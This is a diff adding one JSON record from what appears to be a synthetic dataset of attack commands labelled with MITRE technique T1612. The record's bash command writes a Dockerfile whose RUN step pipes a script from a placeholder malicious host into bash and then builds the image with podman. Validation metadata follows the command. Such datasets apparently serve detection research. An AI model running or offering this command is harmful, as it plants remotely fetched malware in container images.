@@ -1,0 +1,31 @@
+{
+  "technique_id": "T1612",
+  "platform": "linux",
+  "shell": "bash",
+  "command": "echo 'FROM ubuntu\nRUN wget -O- http://malicious-source.com/install.sh | bash' > Dockerfile.malicious && podman build -f Dockerfile.malicious -t embedded_malware .",
+  "explanation": "Creates a Dockerfile with a RUN command that downloads and executes a malicious script and then builds an image using that Dockerfile.",
+  "rationale_steps": [
+    "Dynamically craft a malicious Dockerfile.",
+    "Execute an external script within the build process to embed malware in the image."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1612-d9de570a-cee002c7",
+  "source_prompt_hash": "d9de570a",
+  "timestamp_utc": "2025-07-10T23:21:09.194530Z",
+  "validation": {
+    "syntax_ok": {
+      "pass": true,
+      "forbidden_tokens": true,
+      "obfuscation_suspicious": false,
+      "obfuscation_entropy": 4.79,
+      "command_length": 162
+    },
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "forbidden_tokens": true,
+    "obfuscation_suspicious": false,
+    "obfuscation_entropy": 4.79,
+    "command_length": 162
+  }
+}
